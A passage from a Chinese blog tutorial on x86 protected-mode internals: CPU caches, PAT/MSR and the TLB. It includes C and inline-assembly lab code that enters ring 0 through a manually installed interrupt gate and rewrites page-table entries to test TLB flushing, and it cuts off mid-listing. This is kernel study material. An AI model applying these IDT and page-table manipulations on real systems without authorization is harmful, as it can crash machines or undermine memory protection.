而CPU缓存是物理地址和地址内的数值（内容）间的映射缓存。TLB+CPU缓存搭配可以大大加快读取速度。CPU读写内存时，会先去CPU缓存中寻找该物理地址，如果缓存中存在该物理地址，则读写全部对CPU缓存操作。</p>\n<p>CPU缓存分为3级，<code>L1</code>,<code>L2</code>,<code>L3</code>。</p>\n<p>L1缓存速度最快，容量最小，<code>一个核一个</code>。</p>\n<p>L2缓存比L1容量大，速度略慢。<code>一个核一个</code>。</p>\n<p>L3缓存比L2容量大，速度最慢。<code>所有核共享一个</code>。</p>\n<p>在读写内存时，会依次从L1-&gt;L2-&gt;L3进行查找。若在L2中找到了，会将缓存更新到L1（提升下次访问速度）。若在L3中找到了，会将缓存更新到L1 L2。所以L1一直都在变。</p>\n<h2 id=\"缓存类型\"><a href=\"#缓存类型\" class=\"headerlink\" title=\"缓存类型\"></a>缓存类型</h2><p>Intel<code>定义</code>了如下类型；</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230524231314576.png\" alt=\"image-20230524231314576\"></p>\n<ul>\n<li>UC：无缓存</li>\n<li>WC：组合写（直写+回写），写入缓存，什么时候写入物理内存，由CPU决定。</li>\n<li>WT：直写，即写到物理内存也写入缓存。</li>\n<li>WP：写保护，置1后写内存直接异常。<code>这里的写保护是局部，而CR4中的WP为全局</code></li>\n<li>WB：回写，先写入缓存，过一段时间再写入物理内存。</li>\n<li>UC-：-号代表弱，表示有时候会有缓存，有时候没有。</li>\n</ul>\n<p>一块内存的缓存类型可以通过PAT-PCD-PWT进行组合判断。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230524233000843.png\" alt=\"image-20230524233000843\"></p>\n<h2 id=\"MSR寄存器\"><a href=\"#MSR寄存器\" class=\"headerlink\" title=\"MSR寄存器\"></a>MSR寄存器</h2><blockquote>\n<p>MSR中保存着对PAT属性的定义。可以自己自定义</p>\n</blockquote>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230524233239514.png\" alt=\"image-20230524233239514\"></p>\n<p>windbg使用<code>rdmsr addr</code>来查看保存的值。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230524233420397.png\" alt=\"image-20230524233420397\"></p>\n<p>拆分后得到如下：</p>\n<table>\n<thead>\n<tr>\n<th>PAT7</th>\n<th>PAT6</th>\n<th>PAT5</th>\n<th>PAT4</th>\n<th>PAT3</th>\n<th>PAT2</th>\n<th>PAT1</th>\n<th>PAT0</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>00</td>\n<td>07</td>\n<td>01</td>\n<td>06</td>\n<td>00</td>\n<td>07</td>\n<td>01</td>\n<td>06</td>\n</tr>\n</tbody></table>\n<p>当PAT&#x3D;0，PCD&#x3D;0,PWT&#x3D;0，查右边第0个，也就是PAT*，得到6。6对应到上边的<code>Table 11.10</code>就是WB。</p>\n<h1 id=\"14、TLB\"><a href=\"#14、TLB\" class=\"headerlink\" title=\"14、TLB\"></a>14、TLB</h1><p>TLB（Translation Lookaside Buffer，转换后备缓冲区），tlb保存的是一种&lt;线性地址,物理地址&gt;的映射关系，系统每次在读取地址数据时如果都需要进行拆分，那么带来的消耗巨大，因此Intel设计了一种缓存的形式来缓解开销。当我们读取某个地址时，CPU会首先查询这一块表是否存在映射关系，如果不存在则进行拆分后读取数据并返回，然后将线性地址与物理地址的映射关系保存到TLB表中，如果下一次在读取该地址，则会在TLB中查询对应的物理地址。极大的提高了效率。<code>数据和代码指令各有有自己的TLB</code>。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/QQ%E5%9B%BE%E7%89%8720230519152651.png\" alt=\"QQ图片20230519152651\"></p>\n<ul>\n<li><p>LA：线性地址</p>\n</li>\n<li><p>PA：物理地址</p>\n</li>\n<li><p>ATTR：在10-10-12分页模式下：ATTR &#x3D; PDE属性 &amp; PTE属性。在2-9-9-12分页模式下：ATTR &#x3D; PDPTE属性 &amp; PDE属性 &amp; PTE属性</p>\n</li>\n<li><p>LRU：统计信息。由于TLB的大小有限，因此当TLB被写满、又有新的地址即将写入时，TLB就会根据统计信息来判断哪些地址是不常用的，从而将不常用的记录从TLB中移除。</p>\n</li>\n</ul>\n<p>需要注意的是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">不同的CPU，TLB大小不同。只要Cr3发生变化，TLB立即刷新，一核一套TLB</span><br><span class=\"line\">由于操作系统的高2G映射基本不变，因此如果Cr3改了，TLB刷新的话，重建高2G以上很浪费。</span><br><span class=\"line\">所以PDE和PTE中有个G标志位（当PDE为大页时，G标志位才起作用），如果G位为1，刷新TLB时将不会刷新PDE/PTE</span><br><span class=\"line\">G位为1的页，当TLB写满时，CPU根据统计信息将不常用的地址废弃，保留最常用的地址</span><br></pre></td></tr></table></figure>\n\n<p>TLB也分有下列种类：</p>\n<ul>\n<li>物理页分为普通页（4KB）、大页（2MB&#x2F;4MB），物理页又分为指令和数据。因此分为4种TLB</li>\n<li>缓存一般页表（4KB）的指令页表缓存（Instruction-TLB）</li>\n<li>缓存一般页表（4KB）的数据页表缓存（Data-TLB）</li>\n<li>缓存大尺寸页表（2MB&#x2F;4MB）的指令页表缓存（Instruction-TLB）</li>\n<li>缓存大尺寸页表（2MB&#x2F;4MB）的数据页表缓存（Data-TLB）</li>\n</ul>\n<p>查找流程：</p>\n<p>1、线性地址–&gt;TLB缓存</p>\n<p>2、没有找到  则  线性地址–&gt;物理帧缓存（page struct cache）–&gt;PDE页帧–&gt;PTE页帧（PTE并没有被缓存<br>保存。</p>\n<p>3、都没有则  线性地址–&gt;PDPTE–&gt;PDE-&gt;PTE。</p>\n<h2 id=\"INVLPG指令\"><a href=\"#INVLPG指令\" class=\"headerlink\" title=\"INVLPG指令\"></a>INVLPG指令</h2><p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519154133640.png\" alt=\"image-20230519154133640\"></p>\n<p>简单说该指令用于删除某线性地址在TLB中的记录。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">invlpg dword ps:[0] ;删除0地址在tlb中的缓存</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>以下实验均为101012分页</p>\n</blockquote>\n<h2 id=\"实验一：CR3刷新TLB\"><a href=\"#实验一：CR3刷新TLB\" class=\"headerlink\" title=\"实验一：CR3刷新TLB\"></a>实验一：CR3刷新TLB</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD x, y, z;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">PageOnNull</span>() &#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//保存现场</span></span><br><span class=\"line\">\t\tpush ebp</span><br><span class=\"line\">\t\tmov ebp, esp</span><br><span class=\"line\">\t\tsub esp, <span class=\"number\">0x100</span></span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tpush esi</span><br><span class=\"line\">\t\tpush edi</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD* pPTE;\t\t\t<span class=\"comment\">// 保存目标线性地址的 PTE 线性地址</span></span><br><span class=\"line\">\tDWORD* pNullPTE;\t\t<span class=\"comment\">// 0 地址的 PTE 线性地址</span></span><br><span class=\"line\">\tpNullPTE = (DWORD*)<span class=\"number\">0xC0000000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x50000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x50000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x60000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x60000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\"></span><br><span class=\"line\">\ty = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 刷新 TLB </span></span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">\t\tmov eax, cr3</span><br><span class=\"line\">\t\tmov cr3, eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 再次读取 0 地址位置的数据</span></span><br><span class=\"line\">\tz = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//恢复现场</span></span><br><span class=\"line\">\t\tpop edi</span><br><span class=\"line\">\t\tpop esi</span><br><span class=\"line\">\t\tpop ebx</span><br><span class=\"line\">\t\tmov esp, ebp</span><br><span class=\"line\">\t\tpop ebp</span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDWORD* p5 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x50000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD* p6 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x60000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p5 != (DWORD*)<span class=\"number\">0x50000000</span> || p6 != (DWORD*)<span class=\"number\">0x60000000</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Error alloc!\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*p5 = <span class=\"number\">0x1234</span>;</span><br><span class=\"line\">\t*p6 = <span class=\"number\">0x5678</span>;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过中断门提权</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. 读 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, x);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2. 给 0 地址重新挂上物理页\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3. 重新读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4. 刷新 TLB \\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5. 再次读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n&quot;</span>, z);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519160245941.png\" alt=\"image-20230519160245941\"></p>\n<p>设计中断门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">offset: 0x001213c0</span><br><span class=\"line\">P:1</span><br><span class=\"line\">DPL:3</span><br><span class=\"line\">TYPE:0xE</span><br><span class=\"line\">Selector:1000</span><br><span class=\"line\"></span><br><span class=\"line\">0012ee00`000813c0</span><br></pre></td></tr></table></figure>\n\n<p>写入描述符。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519161304372.png\" alt=\"image-20230519161304372\"></p>\n<p>运行效果</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519161452057.png\" alt=\"image-20230519161452057\"></p>\n<p>可以发现，在x被赋值完成后，即使0地址被挂上了新的物理页，再对y进行赋值，x和y输出的值是相同的。但是在Cr3刷新后，0地址没有被挂上新的物理页，对z进行赋值后，z却输出了新的值。这是因为Cr3刷新前，0地址第一次被x访问时，线性地址与物理地址的对应关系被写入了TLB中，因此在对y赋值时，TLB的记录没有被刷新，访问的还是原来的物理页。</p>\n<h2 id=\"实验二：修改pte的G位禁止刷新TLB\"><a href=\"#实验二：修改pte的G位禁止刷新TLB\" class=\"headerlink\" title=\"实验二：修改pte的G位禁止刷新TLB\"></a>实验二：修改pte的G位禁止刷新TLB</h2><p>由于需要给G位置1，因此这里使用windbg进行辅助。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD x, y, z;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">PageOnNull</span>() &#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//保存现场</span></span><br><span class=\"line\">\t\tpush ebp</span><br><span class=\"line\">\t\tmov ebp, esp</span><br><span class=\"line\">\t\tsub esp, <span class=\"number\">0x100</span></span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tpush esi</span><br><span class=\"line\">\t\tpush edi</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD* pPTE;\t\t\t<span class=\"comment\">// 保存目标线性地址的 PTE 线性地址</span></span><br><span class=\"line\">\tDWORD* pNullPTE;\t\t<span class=\"comment\">// 0 地址的 PTE 线性地址</span></span><br><span class=\"line\">\tpNullPTE = (DWORD*)<span class=\"number\">0xC0000000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x50000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x50000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\">\t<span class=\"comment\">//修改G位为1</span></span><br><span class=\"line\">\t*pNullPTE = *pNullPTE | <span class=\"number\">0x100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x60000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x60000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\"></span><br><span class=\"line\">\ty = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 刷新 TLB </span></span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">\t\tmov eax, cr3</span><br><span class=\"line\">\t\tmov cr3, eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 再次读取 0 地址位置的数据</span></span><br><span class=\"line\">\tz = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//恢复现场</span></span><br><span class=\"line\">\t\tpop edi</span><br><span class=\"line\">\t\tpop esi</span><br><span class=\"line\">\t\tpop ebx</span><br><span class=\"line\">\t\tmov esp, ebp</span><br><span class=\"line\">\t\tpop ebp</span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDWORD* p5 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x50000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD* p6 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x60000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p5 != (DWORD*)<span class=\"number\">0x50000000</span> || p6 != (DWORD*)<span class=\"number\">0x60000000</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Error alloc!\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t*p5 = <span class=\"number\">0x1234</span>;</span><br><span class=\"line\">\t*p6 = <span class=\"number\">0x5678</span>;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过中断门提权</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. 给0x50000000的PTE的G位赋值为1\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2. 挂载并读 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, x);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3. 给 0 地址重新挂上物理页\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4. 重新读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5. 刷新 TLB \\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;6. 再次读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n&quot;</span>, z);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行效果。</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230519164716376.png\" alt=\"image-20230519164716376\"></p>\n<p>实验结果证明G&#x3D;1时，TLB不刷新。</p>\n<h2 id=\"实验三：INVLPG刷新TLB\"><a href=\"#实验三：INVLPG刷新TLB\" class=\"headerlink\" title=\"实验三：INVLPG刷新TLB\"></a>实验三：INVLPG刷新TLB</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD x, y, z;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">PageOnNull</span>() &#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//保存现场</span></span><br><span class=\"line\">\t\tpush ebp</span><br><span class=\"line\">\t\tmov ebp, esp</span><br><span class=\"line\">\t\tsub esp, <span class=\"number\">0x100</span></span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tpush esi</span><br><span class=\"line\">\t\tpush edi</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD* pPTE;\t\t\t<span class=\"comment\">// 保存目标线性地址的 PTE 线性地址</span></span><br><span class=\"line\">\tDWORD* pNullPTE;\t\t<span class=\"comment\">// 0 地址的 PTE 线性地址</span></span><br><span class=\"line\">\tpNullPTE = (DWORD*)<span class=\"number\">0xC0000000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x50000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x50000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 挂上 0x60000000 所在位置</span></span><br><span class=\"line\">\tpPTE = (DWORD*)(<span class=\"number\">0xC0000000</span> + (<span class=\"number\">0x60000000</span> &gt;&gt; <span class=\"number\">10</span>));\t</span><br><span class=\"line\">\t*pNullPTE = *pPTE;</span><br><span class=\"line\"></span><br><span class=\"line\">\ty = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 刷新 TLB </span></span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tinvlpg dword ptr ds:[<span class=\"number\">0</span>]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 再次读取 0 地址位置的数据</span></span><br><span class=\"line\">\tz = *(DWORD*)<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//恢复现场</span></span><br><span class=\"line\">\t\tpop edi</span><br><span class=\"line\">\t\tpop esi</span><br><span class=\"line\">\t\tpop ebx</span><br><span class=\"line\">\t\tmov esp, ebp</span><br><span class=\"line\">\t\tpop ebp</span><br><span class=\"line\">\t\tiretd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDWORD* p5 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x50000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD* p6 = (DWORD*)<span class=\"built_in\">VirtualAlloc</span>((LPVOID)<span class=\"number\">0x60000000</span>, <span class=\"number\">4</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (p5 != (DWORD*)<span class=\"number\">0x50000000</span> || p6 != (DWORD*)<span class=\"number\">0x60000000</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Error alloc!\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*p5 = <span class=\"number\">0x1234</span>;</span><br><span class=\"line\">\t*p6 = <span class=\"number\">0x5678</span>;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 通过中断门提权</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> <span class=\"number\">0x20</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. 读 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, x);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2. 给 0 地址重新挂上物理页\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3. 重新读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n\\n&quot;</span>, y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4. 刷新 TLB \\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5. 再次读取 0 地址数据:\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;*NULL = 0x%x \\n&quot;</span>, z);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行效果</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521142724659.png\" alt=\"image-20230521142724659\"></p>\n<h2 id=\"实验四：CR4刷新TLB\"><a href=\"#实验四：CR4刷新TLB\" class=\"headerlink\" title=\"实验四：CR4刷新TLB\"></a>实验四：CR4刷新TLB</h2><p>CR4中第八位PGE位</p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521143220842.png\" alt=\"image-20230521143220842\"></p>\n<p><img src=\"/../images/Window-Kernel/X86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20230521143513360.png\" alt=\"image-20230521143513360\"></p>\n<p>由于VS不支持CR4，因此使用硬编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">009D126E | 0F20E0                   | mov eax,cr4                                               |</span><br><span class=\"line\">009D1271 | 0F22E0                   | mov cr4,eax                                               |</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD x, y, z;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __declspec(naked) <span class=\"built_in\">PageOnNull</span>() &#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//保存现场</span></span><br><span class=\"line\">\t\tpush ebp</span><br><span class=\"line\">\t\tmov ebp, esp</span><br><span class=\"line\">\t\tsub esp, <span class=\"number\">0x100</span></span><br><span class=\"line\">\t\tpush ebx</span><br><span 